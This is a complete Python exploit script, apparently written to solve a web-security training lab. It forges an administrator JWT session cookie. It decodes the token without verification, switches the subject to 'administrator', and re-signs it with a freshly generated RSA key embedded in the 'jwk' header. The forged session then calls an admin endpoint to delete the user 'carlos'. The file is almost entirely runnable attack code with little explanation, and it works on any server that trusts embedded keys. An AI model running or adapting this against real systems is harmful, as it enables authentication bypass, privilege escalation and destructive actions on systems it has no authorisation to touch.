import requests
import sys
import time
import jwt
import urllib3
from jwcrypto import jwk
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# pip install jwcrypto pyjwt


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None


def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
        r = s.post(login_page, data=data, verify=False, proxies=proxies, timeout=10)
        if f"Your username is: {username}" in r.text:
            return True
    return False


def forge_admin_cookie(s):
    cookie = s.cookies.get("session")
    if not cookie:
        return False

    payload = jwt.decode(cookie, options={"verify_signature": False})
    payload["sub"] = "administrator"

    # Generate our own RSA key pair. The server has no way to know this
    # key wasn't the one it originally configured, since the attack relies
    # on it trusting whatever public key shows up in the "jwk" header
    # instead of looking one up from its own trusted key store.
    rsa_key = jwk.JWK.generate(kty="RSA", size=2048)
    public_jwk = rsa_key.export_public(as_dict=True)
    private_pem = rsa_key.export_to_pem(private_key=True, password=None)

    forged = jwt.encode(payload, private_pem, algorithm="RS256", headers={"jwk": public_jwk})
    s.cookies.set("session", forged)
    return True


def delete_carlos(s, url):
    r = s.get(url + "/admin/delete?username=carlos", verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(url + "/", verify=False, proxies=proxies, timeout=10)
        if 'Congratulations' in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return False
    print("[+] Logged in as wiener")

    if not forge_admin_cookie(s):
        print("[-] Failed to forge admin cookie")
        return False
    print("[+] Forged session cookie with injected JWK, sub=administrator")

    if not delete_carlos(s, url):
        print("[-] Failed to delete carlos")
        return False
    print("[+] Deleted carlos")

    check_solved(s, url)


if __name__ == "__main__":
    main()